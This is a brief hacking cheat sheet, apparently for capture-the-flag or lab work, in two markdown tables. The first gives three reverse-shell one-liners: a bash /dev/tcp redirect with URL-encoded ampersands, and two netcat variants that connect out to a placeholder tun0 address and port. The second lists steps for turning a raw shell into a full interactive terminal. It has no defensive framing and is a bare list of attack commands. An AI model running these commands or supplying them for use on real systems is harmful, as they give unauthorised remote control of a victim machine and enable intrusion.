# Cheatsheet Hacking 🐱‍💻


## Obtain a reverse shell 🚫

| Command |
|:-------|
| `bash -c "bash -i >%26 /dev/tcp/<tun0 IP>/<port> 0>%261"` |
| `nc -e /bin/bash <tun0> <port>` |
| `nc -c bash <tun0> <port>` |

## Fix errors to obtain a reverse shell

| Step|Command |
|:-------:|:----|
| 1 | `script /dev/null -c bash` |
| 2 | `Ctrl` + `Z` |
| 3 | `stty raw -echo; fg` |
| 4 | `reset` |
| 5 | `xterm` |
| 6 | `export TERM=xterm` |
| 7 | `export BASH=shell` |
| 8 | `stty size` |
| 9 | `stty rows <N> columns <N>` |

